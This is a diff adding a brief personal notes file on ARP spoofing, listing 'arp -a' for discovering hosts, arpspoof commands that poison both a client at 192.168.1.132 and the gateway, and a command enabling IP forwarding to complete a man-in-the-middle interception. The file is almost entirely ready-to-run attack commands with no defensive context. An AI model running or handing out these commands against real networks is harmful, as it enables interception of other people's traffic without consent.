@@ -1,0 +1,16 @@
+knowing the mac and ip : arp -a // show all connected devices 
+
+arp spoofing :
+
+syntax: 
+arpspoof -i [interface_name] -t [client_ip] [gateway_ip]
+arpspoof -i [interface_name] -t [gateway_ip] [client_ip]
+
+use:
+arpspoof -i eth0 -t 192.168.1.132 192.168.1.1
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.132
+
+
+now for forwarding the ip :
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
